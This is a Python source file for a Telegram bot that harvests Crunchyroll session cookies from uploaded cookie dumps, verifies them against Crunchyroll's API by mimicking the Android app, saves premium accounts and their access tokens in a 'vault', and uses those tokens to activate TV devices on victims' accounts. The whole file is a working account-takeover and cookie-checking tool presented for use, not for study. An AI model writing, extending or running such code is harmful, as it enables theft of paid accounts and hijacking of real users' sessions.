#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import io
import sys
import json
import time
import base64
import asyncio
import logging
import zipfile
import threading
import requests
import uuid
import http.server
import socketserver
from pathlib import Path
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone

try:
    from telegram import Update
    from telegram.constants import ParseMode
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
except ImportError:
    print("[!] pip install python-telegram-bot==22.8")
    sys.exit(1)

# ===================== CONFIG =====================
def _env(name: str, default: str = "") -> str:
    v = os.getenv(name)
    if v is None or str(v).strip() == "": return default
    return str(v).strip()

BOT_TOKEN = _env("BOT_TOKEN")
OWNER_ID = int(_env("OWNER_ID", "0") or 0)
PORT = int(_env("PORT", "8080") or 8080)

DATA_DIR = Path("data")
DATA_DIR.mkdir(parents=True, exist_ok=True)
VAULT_PATH = DATA_DIR / "cr_vault.json"

# App/Mobile API Endpoints (Cloudflare Bypass)
WEB_HOST = "https://www.crunchyroll.com"
API_HOST = "https://beta-api.crunchyroll.com"
APP_UA = "Crunchyroll/3.65.0 Android/10 okhttp/4.12.0"

# ===================== WEB SERVER (Render Fix) =====================
def run_health_check():
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running perfectly!")
        def log_message(self, format, *args): pass
    try:
        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print(f"[+] Dummy Web Server running on port {PORT}")
            httpd.serve_forever()
    except Exception as e: 
        print(f"[-] Web server error: {e}")

# ===================== VAULT STORAGE =====================
_VAULT_LOCK = threading.Lock()

def load_vault() -> List[dict]:
    with _VAULT_LOCK:
        if VAULT_PATH.exists():
            try: return json.loads(VAULT_PATH.read_text(encoding="utf-8"))
            except: return []
        return []

def save_vault(items: List[dict]) -> None:
    with _VAULT_LOCK:
        try:
            tmp = VAULT_PATH.with_suffix(".tmp")
            tmp.write_text(json.dumps(items, indent=2, ensure_ascii=False), encoding="utf-8")
            os.replace(tmp, VAULT_PATH)
        except: pass

def add_to_vault(entries: List[dict]) -> int:
    if not entries: return 0
    with _VAULT_LOCK:
        current = load_vault()
        have = {f"{x.get('cred',{}).get('value')}" for x in current}
        added = 0
        for e in entries:
            val = e.get("cred", {}).get("value")
            if not val or val in have: continue
            current.append({"cred": e["cred"], "data": e.get("data") or {}, "added_at": int(time.time())})
            have.add(val)
            added += 1
        if added: save_vault(current)
        return added

# ===================== EXTRACTOR =====================
def extract_cookies_from_text(text: str) -> List[str]:
    cookies = set()
    
    # 1. Netscape Format (Standard cookie txt)
    for line in text.split('\n'):
        line = line.strip()
        if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')): continue
        if line.startswith('#HttpOnly_'): line = line[10:]
        parts = line.split('\t')
        if len(parts) >= 7 and parts[5].strip() == 'etp_rt':
            val = parts[6].strip()
            if val: cookies.add(val)
            
    # 2. JSON Format
    try:
        stripped = text.strip()
        if stripped.startswith('[') or stripped.startswith('{'):
            data = json.loads(stripped)
            items = data if isinstance(data, list) else (data.get("cookies") or [data])
            if isinstance(items, list):
                for item in items:
                    if isinstance(item, dict) and item.get("name") == "etp_rt":
                        val = str(item.get("value", "")).strip()
                        if val: cookies.add(val)
    except: pass

    # 3. Regex Patterns (For raw text formats)
    patterns = [
        r'etp_rt[=\s]+([a-f0-9-]{36})',
        r'etp_rt["\']?\s*:\s*["\']([^"\']+)',
        r'etp_rt\s+([a-f0-9-]{36})',
        r'["\']etp_rt["\']\s*:\s*["\']([^"\']+)',
    ]
    for p in patterns:
        for m in re.finditer(p, text, re.IGNORECASE):
            val = m.group(1).strip()
            if len(val) >= 20: cookies.add(val)

    return list(cookies)

def extract_text_from_zip(raw_bytes: bytes) -> str:
    chunks = []
    try:
        with zipfile.ZipFile(io.BytesIO(raw_bytes), "r") as zf:
            for zinfo in zf.infolist():
                if not zinfo.filename.endswith("/") and not zinfo.filename.startswith("__MACOSX"):
                    chunks.append(zf.read(zinfo.filename).decode("utf-8", errors="ignore"))
    except Exception as e: print("ZIP Error:", e)
    return "\n".join(chunks)

# ===================== API CHECKER =====================
def check_cookie(etp_rt: str):
    session = requests.Session()
    session.verify = False
    
    # STEP 1: Get Token (Mobile App Flow to bypass Cloudflare)
    data = {
        "grant_type": "etp_rt_cookie",
        "device_id": str(uuid.uuid4()),
        "device_type": "Android TV"
    }
    headers = {
        "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6", # Crunchyroll Basic Auth
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": APP_UA,
        "ETP-Anonymous-ID": str(uuid.uuid4()), # Mandatory header
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/"
    }
    
    try:
        r = session.post(f"{API_HOST}/auth/v1/token", data=data, headers=headers, cookies={"etp_rt": etp_rt}, timeout=15)
        if r.status_code != 200: 
            return {"status": "error", "code": f"HTTP_{r.status_code}"}
        token_data = r.json()
        access_token = token_data.get('access_token')
        if not access_token: 
            return {"status": "error", "code": "no_token"}
    except Exception as e:
        return {"status": "error", "code": "network"}

    # STEP 2: Get User Info
    hdr = {
        "Authorization": f"Bearer {access_token}", 
        "User-Agent": APP_UA,
        "Accept": "application/json"
    }
    try:
        r = session.get(f"{API_HOST}/accounts/v1/me", headers=hdr, timeout=15)
        if r.status_code != 200: 
            return {"status": "error", "code": f"me_{r.status_code}"}
        me = r.json()
        email = me.get("email", "N/A")
        acc_id = me.get("account_id")
    except Exception:
        return {"status": "error", "code": "me_failed"}

    # STEP 3: Check Subscription
    try:
        r = session.get(f"{API_HOST}/subs/v4/accounts/{acc_id}/subscriptions", headers=hdr, timeout=15)
        if r.status_code == 200:
            subs = r.json().get("subscriptions", [])
            if subs:
                sub = subs[0]
                plan = sub.get("plan", {}).get("tier", {}).get("text", "Premium")
                expiry = sub.get("nextRenewalDate", "")[:10]
                return {"status": "hit", "email": email, "plan": plan, "expiry": expiry, "token": access_token}
        return {"status": "free"}
    except Exception:
        return {"status": "error", "code": "sub_failed"}

# ===================== BOT HANDLERS =====================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    vault_count = len(load_vault())
    text = (
        f"🔥 **Crunchyroll Bot Active**\n\n"
        f"🗄️ Saved Accounts: `{vault_count}`\n\n"
        f"📂 **Send a .txt, .json, or .zip file** to scan and save.\n"
        f"📺 Use `/tv CODE` to activate TV."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc: return
    
    msg = await update.message.reply_text("📥 File downloading...")
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        buf = io.BytesIO()
        await tg_file.download_to_memory(buf)
        raw_data = buf.getvalue()
    except Exception as e:
        await msg.edit_text(f"❌ Download failed: {e}")
        return

    await msg.edit_text("🔍 Extracting cookies from file...")
    
    if doc.file_name.lower().endswith(".zip"):
        text = extract_text_from_zip(raw_data)
    else:
        text = raw_data.decode("utf-8", errors="ignore")
        
    cookies = extract_cookies_from_text(text)
    
    if not cookies:
        await msg.edit_text("❌ No `etp_rt` cookies found in this file.")
        return

    await msg.edit_text(f"✅ Found {len(cookies)} cookies.\n⏳ Checking accounts (please wait)...")

    # Async safe execution
    loop = asyncio.get_running_loop()
    
    def run_checks():
        results_list = []
        with ThreadPoolExecutor(max_workers=10) as ex:
            results = list(ex.map(check_cookie, cookies))
            
        hits = []
        free = 0
        dead = 0
        errors = 0
        
        for cookie, res in zip(cookies, results):
            if res["status"] == "hit":
                hits.append({"cred": {"type": "cookie", "value": cookie}, "data": res})
            elif res["status"] == "free":
                free += 1
            elif res["status"] == "error":
                errors += 1
            else:
                dead += 1
                
        return hits, free, dead, errors

    hits, free, dead, errors = await loop.run_in_executor(None, run_checks)

    stats_text = (
        f"📊 **Scan Results**\n\n"
        f"✅ Premium Hits: `{len(hits)}`\n"
        f"🆓 Free Accounts: `{free}`\n"
        f"❌ Dead/Invalid: `{dead}`\n"
        f"⚠️ API/Network Errors: `{errors}`\n\n"
    )

    if hits:
        add_to_vault(hits)
        await msg.edit_text(
            f"🎉 **Scan Complete!**\n\n{stats_text}"
            f"🗄️ Total in Vault: `{len(load_vault())}`", 
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await msg.edit_text(
            f"❌ **No Premium hits found.**\n\n{stats_text}"
            f"*(Tip: If Errors are high, Render IP might be blocked by Cloudflare temporarily)*", 
            parse_mode=ParseMode.MARKDOWN
        )

async def cmd_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: `/tv ABCD12`", parse_mode=ParseMode.MARKDOWN)
        return
    code = re.sub(r"[^A-Z0-9]", "", context.args[0].upper())
    if len(code) != 6:
        await update.message.reply_text("❌ Code must be 6 characters.")
        return
        
    vault = load_vault()
    if not vault:
        await update.message.reply_text("❌ Vault is empty. Upload cookies first.")
        return
        
    msg = await update.message.reply_text(f"📺 Activating TV with `{code}`...", parse_mode=ParseMode.MARKDOWN)
    
    for entry in reversed(vault):
        token = entry.get("data", {}).get("token")
        if not token: continue
        
        headers = {"Authorization": f"Bearer {token}", "User-Agent": APP_UA, "Content-Type": "application/json"}
        for base in (WEB_HOST, API_HOST):
            try:
                r = requests.post(f"{base}/auth/v1/device", json={"user_code": code}, headers=headers, timeout=15)
                if r.status_code in (200, 201, 204):
                    data = entry.get("data", {})
                    await msg.edit_text(
                        f"✅ **TV Activated Successfully!**\n\n"
                        f"📧 Email: `{data.get('email')}`\n"
                        f"📦 Plan: `{data.get('plan')}`\n"
                        f"📅 Expiry: `{data.get('expiry')}`", 
                        parse_mode=ParseMode.MARKDOWN
                    )
                    return
            except: pass
            
    await msg.edit_text("❌ Activation failed. Code expired or accounts invalid.")

# ===================== MAIN =====================
def main():
    if not BOT_TOKEN or not OWNER_ID:
        print("[!] BOT_TOKEN or OWNER_ID missing.")
        return
        
    threading.Thread(target=run_health_check, daemon=True).start()
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("tv", cmd_tv))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print(f"[+] Bot started | Vault: {len(load_vault())}")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
